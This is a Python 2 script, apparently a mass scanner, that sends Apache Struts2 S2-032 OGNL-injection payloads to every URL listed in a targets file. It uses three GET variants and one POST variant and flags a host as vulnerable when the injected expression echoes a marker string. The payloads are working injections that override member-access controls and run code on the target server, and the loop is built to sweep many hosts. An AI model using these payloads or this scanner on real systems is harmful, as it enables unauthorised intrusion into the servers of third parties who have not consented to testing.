# usr/bin/env python
# coding: utf-8
import urllib2
import urllib
import re
import random
import requests
import time
  
user_agents = ['Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0', \
		'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0', \
		'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533+ \
		(KHTML, like Gecko) Element Browser 5.0', \
		'IBM WebExplorer /v0.94', 'Galaxy/1.0 [en] (Mac OS X 10.5.6; U; en)', \
		'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)', \
		'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14', \
		'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) \
		Version/6.0 Mobile/10A5355d Safari/8536.25', \
		'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) \
		Chrome/28.0.1468.0 Safari/537.36', \
		'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; TheWorld)']

def verify(url, attack):
	#proxies = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080',}	
	urls = url + attack
	try:
		get = requests.get(urls)
		#get = requests.get(urls, proxies=proxies, verify=False)
		if 'Struts2 S2-032 Vulnerable' in get.text:
			print "Vulnerable"
	except:
		pass

def verifyPost(url, payload):
	#proxies = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080',}	
	urls = url
	header = {"Content-Type" : "application/x-www-form-urlencoded"}
	try:
		post = requests.post(urls, data=payload, headers=header)
		#get = requests.post(urls, data=payload, headers=header, proxies=proxies, verify=False)
		if 'Struts2 S2-032 Vulnerable' in post.text:
			print "Vulnerable"
	except:
		pass

attack = [
"?method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23test%3D%23context.get%28%23parameters.res%5B0%5D%29.getWriter%28%29%2C%23test.println%28%23parameters.command%5B0%5D%29%2C%23test.flush%28%29%2C%23test.close&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=%23%23%23Struts2 S2-032 Vulnerable%23%23%23",
"?method:%23%5fmemberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23test%3D%23context.get%28%23parameters.res%5B0%5D%29.getWriter%28%29%2C%23test.println%28%23parameters.command%5B0%5D%29%2C%23test.flush%28%29%2C%23test.close&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=%23%23%23Struts2 S2-032 Vulnerable%23%23%23",
"?method:%23%5FmemberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23test%3D%23context.get%28%23parameters.res%5B0%5D%29.getWriter%28%29%2C%23test.println%28%23parameters.command%5B0%5D%29%2C%23test.flush%28%29%2C%23test.close&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=%23%23%23Struts2 S2-032 Vulnerable%23%23%23"
]

payload = "method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23test%3D%23context.get%28%23parameters.res%5B0%5D%29.getWriter%28%29%2C%23test.println%28%23parameters.command%5B0%5D%29%2C%23test.flush%28%29%2C%23test.close&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=%23%23%23Struts2 S2-032 Vulnerable%23%23%23"

if __name__ == "__main__":
	f = open('targets.txt', 'r')
	urls = []
	for line in f:
		urls.append(line.splitlines()[0])
	#print urls
	for url in urls:
		print "testing  "+url
		verify(url, attack[0])
		verify(url, attack[1])
		verify(url, attack[2])
		verifyPost(url, payload)
		print "===================="
		time.sleep(1)
	
